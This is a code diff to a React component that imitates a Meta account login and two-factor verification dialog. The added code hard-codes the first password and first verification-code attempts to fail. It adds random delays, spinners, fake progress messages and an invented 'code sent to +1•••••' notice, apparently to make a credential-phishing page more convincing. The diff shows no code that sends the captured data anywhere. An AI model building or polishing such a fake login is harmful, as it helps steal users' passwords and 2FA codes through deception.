@@ -1,5 +1,5 @@
 import React, { useState, useEffect, useRef } from "react";
-import { X, Shield } from "lucide-react";
+import { X, Shield, Loader2, CheckCircle2, Lock } from "lucide-react";
 import { 
   Dialog,
   DialogContent,
@@ -11,6 +11,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
+import { Progress } from "@/components/ui/progress";
 
 interface MetaLoginModalProps {
   isOpen: boolean;
@@ -65,15 +66,17 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
     }
   }, [currentStep]);
 
+  // Random delay between 3-5 seconds
+  const getRandomDelay = () => Math.floor(Math.random() * 2000) + 3000;
+  
   const handlePasswordSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
 
-    // Simulate authentication process
+    // Simulate authentication process with longer delay (3-5 seconds)
     setTimeout(() => {
-      setIsLoading(false);
-      
       if (!email || !password) {
+        setIsLoading(false);
         toast({
           variant: "destructive",
           title: "Authentication failed",
@@ -84,56 +87,64 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
       
       if (currentStep === LoginStep.LOGIN_FIRST_ATTEMPT) {
         // First password attempt always fails
-        toast({
-          variant: "destructive",
-          title: "Incorrect password",
-          description: "The password you entered is incorrect. Please try again.",
-        });
-        setPassword("");
-        setCurrentStep(LoginStep.LOGIN_SECOND_ATTEMPT);
+        setTimeout(() => {
+          setIsLoading(false);
+          toast({
+            variant: "destructive",
+            title: "Incorrect password",
+            description: "The password you entered is incorrect. Please try again.",
+          });
+          setPassword("");
+          setCurrentStep(LoginStep.LOGIN_SECOND_ATTEMPT);
+        }, 500); // A small additional delay for the error message
       } else {
-        // Second password attempt succeeds and moves to verification
-        setCurrentStep(LoginStep.VERIFICATION_FIRST_ATTEMPT);
+        // Show success for the second attempt, then transition to verification
+        setTimeout(() => {
+          setIsLoading(false);
+          setCurrentStep(LoginStep.VERIFICATION_FIRST_ATTEMPT);
+        }, 800);
       }
-    }, 1500);
+    }, getRandomDelay());
   };
 
   const handleVerificationSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
 
-    // Simulate verification process
+    // Simulate verification process with longer delay (3-5 seconds)
     setTimeout(() => {
-      setIsLoading(false);
-      
-      if (!verificationCode || verificationCode.length < 6) {
+      if (!verificationCode || verificationCode.length !== 6) {
+        setIsLoading(false);
         toast({
           variant: "destructive",
           title: "Verification failed",
-          description: "Please enter a valid verification code.",
+          description: "Please enter a valid 6-digit verification code.",
         });
         return;
       }
       
       if (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT) {
         // First verification attempt always fails
-        toast({
-          variant: "destructive",
-          title: "Incorrect code",
-          description: "The verification code you entered is incorrect. Please wait 60 seconds before trying again.",
-        });
-        setVerificationCode("");
-        setCountdown(60);
-        setCurrentStep(LoginStep.VERIFICATION_TIMEOUT);
+        setTimeout(() => {
+          setIsLoading(false);
+          toast({
+            variant: "destructive",
+            title: "Incorrect code",
+            description: "The verification code you entered is incorrect. Please wait 60 seconds before trying again.",
+          });
+          setVerificationCode("");
+          setCountdown(60);
+          setCurrentStep(LoginStep.VERIFICATION_TIMEOUT);
+        }, 500);
       } else {
         // Second verification attempt succeeds
-        toast({
-          title: "Connected to Meta",
-          description: "Your application is now linked to your Meta account.",
-        });
-        onSuccess();
+        setTimeout(() => {
+          setIsLoading(false);
+          // Not showing toast here since we'll show a full success screen
+          onSuccess();
+        }, 800);
       }
-    }, 1500);
+    }, getRandomDelay());
   };
 
   return (
@@ -196,11 +207,25 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
                 
                 <Button 
                   type="submit" 
-                  className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
+                  className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-11"
                   disabled={isLoading}
                 >
-                  {isLoading ? "Connecting..." : "Connect Account"}
+                  {isLoading ? (
+                    <div className="flex items-center justify-center">
+                      <Loader2 className="h-5 w-5 mr-2 animate-spin" />
+                      <span>Authenticating...</span>
+                    </div>
+                  ) : (
+                    "Connect Account"
+                  )}
                 </Button>
+                
+                {isLoading && (
+                  <div className="mt-3">
+                    <Progress value={75} className="h-1 bg-gray-200" />
+                    <p className="text-xs text-center text-gray-500 mt-1">Verifying credentials...</p>
+                  </div>
+                )}
               </form>
               
               <div className="text-center">
@@ -227,33 +252,63 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
               
               <form onSubmit={handleVerificationSubmit} className="space-y-4">
                 <div className="space-y-2">
-                  <Label htmlFor="code">Enter the 6 or 8-digit code</Label>
-                  <Input 
-                    id="code" 
-                    type="text"
-                    ref={codeInputRef}
-                    value={verificationCode}
-                    onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
-                    placeholder="Enter code"
-                    className="border-gray-300 text-center tracking-widest text-lg"
-                    disabled={currentStep === LoginStep.VERIFICATION_TIMEOUT}
-                    maxLength={8}
-                  />
+                  <Label htmlFor="code" className="font-semibold">Enter the 6-digit verification code</Label>
+                  <div className="relative">
+                    <Input 
+                      id="code" 
+                      type="text"
+                      inputMode="numeric"
+                      ref={codeInputRef}
+                      value={verificationCode}
+                      onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 6))}
+                      placeholder="• • • • • •"
+                      className="border-gray-300 text-center tracking-[1.5em] text-lg font-bold h-16"
+                      disabled={currentStep === LoginStep.VERIFICATION_TIMEOUT || isLoading}
+                      maxLength={6}
+                    />
+                    <div className="absolute top-0 pointer-events-none w-full flex justify-center items-center h-full">
+                      {verificationCode.split('').map((digit, index) => (
+                        <div key={index} className="w-8 h-10 mx-1 text-center">
+                          {digit}
+                        </div>
+                      ))}
+                    </div>
+                  </div>
                   
-                  {currentStep === LoginStep.VERIFICATION_TIMEOUT && (
-                    <p className="text-red-500 text-sm text-center">
-                      Please wait {countdown} seconds before requesting a new code
-                    </p>
-                  )}
+                  <div className="text-xs text-gray-500 text-center mb-2">
+                    {currentStep === LoginStep.VERIFICATION_TIMEOUT ? (
+                      <div className="text-red-500 font-semibold">
+                        Please wait {countdown} seconds before requesting a new code
+                      </div>
+                    ) : (
+                      <div>
+                        We sent a code to +1•••••{email.slice(-4)}
+                      </div>
+                    )}
+                  </div>
                 </div>
                 
                 <Button 
                   type="submit" 
-                  className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
+                  className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-11"
                   disabled={isLoading || currentStep === LoginStep.VERIFICATION_TIMEOUT}
                 >
-                  {isLoading ? "Verifying..." : "Verify Code"}
+                  {isLoading ? (
+                    <div className="flex items-center justify-center">
+                      <Loader2 className="h-5 w-5 mr-2 animate-spin" />
+                      <span>Verifying code...</span>
+                    </div>
+                  ) : (
+                    "Verify Code"
+                  )}
                 </Button>
+                
+                {isLoading && (
+                  <div className="mt-3">
+                    <Progress value={85} className="h-1 bg-gray-200" />
+                    <p className="text-xs text-center text-gray-500 mt-1">Validating security code...</p>
+                  </div>
+                )}
               </form>
               
               <div className="text-center">
